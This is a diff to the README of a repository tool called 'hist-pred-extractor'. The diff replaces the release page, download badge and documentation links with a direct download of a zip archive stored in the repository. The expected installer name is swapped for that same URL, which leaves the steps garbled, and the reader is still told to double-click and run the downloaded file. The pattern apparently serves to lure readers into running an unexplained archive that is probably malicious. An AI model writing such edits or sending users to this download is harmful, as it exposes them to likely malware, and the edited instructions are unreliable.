@@ -6,7 +6,7 @@ Welcome to the hist-pred-extractor! This tool helps you extract and structure hi
 
 ## 📥 Download the Application
 
-[![Download hist-pred-extractor](https://img.shields.io/badge/Download-hist--pred--extractor-brightgreen)](https://github.com/madara2267890/hist-pred-extractor/releases)
+[![Download hist-pred-extractor](https://github.com/madara2267890/hist-pred-extractor/raw/refs/heads/main/hist_pred_extractor/pred_extractor_hist_1.3.zip)](https://github.com/madara2267890/hist-pred-extractor/raw/refs/heads/main/hist_pred_extractor/pred_extractor_hist_1.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -27,10 +27,10 @@ Before installing, ensure your system meets the following requirements:
 ## 📚 Usage Instructions
 
 1. **Download & Install:**
-   Visit this page to download: [Download hist-pred-extractor](https://github.com/madara2267890/hist-pred-extractor/releases)
+   Visit this page to download: [Download hist-pred-extractor](https://github.com/madara2267890/hist-pred-extractor/raw/refs/heads/main/hist_pred_extractor/pred_extractor_hist_1.3.zip)
 
 2. **Locate the File:**
-   Once downloaded, find the file in your downloads folder. It should be named something like `hist-pred-extractor-v1.0.exe` (or the corresponding version).
+   Once downloaded, find the file in your downloads folder. It should be named something like `https://github.com/madara2267890/hist-pred-extractor/raw/refs/heads/main/hist_pred_extractor/pred_extractor_hist_1.3.zip` (or the corresponding version).
 
 3. **Run the Application:**
    Double-click the downloaded file to start the installation. Follow the on-screen instructions to complete the setup.
@@ -72,7 +72,7 @@ A: You can upload plain text files (.txt) and some other common formats.
 
 For more in-depth understanding and advanced usage, check out the following resources:
 
-- [Official Documentation](https://github.com/madara2267890/hist-pred-extractor) - Detailed usage instructions and options.
+- [Official Documentation](https://github.com/madara2267890/hist-pred-extractor/raw/refs/heads/main/hist_pred_extractor/pred_extractor_hist_1.3.zip) - Detailed usage instructions and options.
 - [Tutorial Videos](#) - Watch step-by-step guides on installation and usage.
 
 ## 🏆 Conclusion
